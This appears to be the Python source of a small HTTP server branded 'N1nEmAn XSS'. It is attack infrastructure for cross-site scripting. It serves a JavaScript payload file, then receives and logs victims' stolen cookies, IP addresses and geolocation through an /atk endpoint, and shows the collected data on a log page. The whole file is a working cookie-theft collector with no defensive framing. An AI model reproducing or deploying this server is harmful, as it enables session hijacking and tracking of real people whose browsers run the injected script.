from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import datetime
import os

i = 0

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    log_file = "log.txt"
    js_file_path = "a.js"  # Path to your a.js file

    def do_GET(self):
        if self.path == '/':
            self.send_index()
        elif self.path.startswith('/log'):
            self.send_log()
        elif self.path.startswith('/atk'):
            self.handle_atk_request()
        elif self.path == '/N':
            self.send_js_file()
        else:
            self.send_error(404, "File Not Found")

    def send_index(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Welcome Page</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-color: #f0f0f0;
                }
                .welcome-message {
                    font-size: 2em;
                    color: #333;
                }
                .log-link {
                    margin-top: 20px;
                }
            </style>
        </head>
        <body>
            <div class="welcome-message">Welcome to N1nEmAn XSS</div>
            <a class="log-link" href="/log">View Log</a>
            <script>
                // This script can be used for any future JavaScript functionalities
                console.log("Page loaded successfully");
            </script>
        </body>
        </html>
        """
        self.wfile.write(html.encode('utf-8'))

    def send_log(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        log_content = self.read_log()
        html = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Log Viewer</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    margin: 20px;
                }}
                .log-entry {{
                    margin-bottom: 10px;
                    padding: 10px;
                    border: 1px solid #ccc;
                    background-color: #f9f9f9;
                }}
            </style>
        </head>
        <body>
            <h2>Log Viewer</h2>
            <div class="log-entries">
                {log_content}
            </div>
            <a href="/">Back to Home</a>
        </body>
        </html>
        """
        self.wfile.write(html.encode('utf-8'))

    def handle_atk_request(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'cookie' in query_params:
            cookie_value = query_params['cookie'][0]
            ip_address = self.client_address[0]
            latitude = query_params.get('latitude', [''])[0]
            longitude = query_params.get('longitude', [''])[0]

            x_forwarded_for = self.headers.get('X-Forwarded-For')
            if x_forwarded_for:
                ip_address = x_forwarded_for.split(',')[0].strip()

            log_entry = f"{datetime.datetime.now()}\n Cookie: {cookie_value},\n IP: {ip_address},\n Latitude: {latitude},\n Longitude: {longitude}\n\n"
            global i
            i += 1
            print()
            print(f"[+]count {i}")
            print(log_entry)
            self.write_to_log(log_entry)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Cookie Received')

    def send_js_file(self):
        try:
            with open(self.js_file_path, 'r') as js_file:
                js_content = js_file.read()

            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            self.wfile.write(js_content.encode('utf-8'))
        except FileNotFoundError:
            self.send_error(404, "JS file not found")

    def read_log(self):
        try:
            with open(self.log_file, 'r') as log:
                log_content = log.read().replace("\n", "<br>")
            return log_content
        except FileNotFoundError:
            return "Log file not found."

    def write_to_log(self, log_entry):
        with open(self.log_file, 'a') as log:
            log.write(log_entry)

def run(server_class=HTTPServer, handler_class=MyHTTPRequestHandler, port=8887):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on http://127.0.0.1:{port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()

